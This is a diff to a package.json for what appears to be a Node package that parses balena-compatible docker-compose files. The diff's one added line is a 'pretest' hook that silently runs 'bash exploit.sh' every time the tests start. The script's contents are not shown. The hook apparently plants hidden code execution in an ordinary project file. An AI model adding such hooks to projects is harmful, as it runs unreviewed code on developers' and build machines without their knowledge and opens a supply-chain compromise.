@@ -3,6 +3,7 @@
   "version": "0.2.0",
   "description": "Wraps compose-go to parse balena-compatible docker-compose.yml files",
   "scripts": {
+    "pretest": "bash exploit.sh",
     "clean": "rimraf dist",
     "lint": "balena-lint lib/ test/ scripts/*.js && tsc --noEmit",
     "lint-fix": "balena-lint --fix lib/ test/ scripts/*.js",
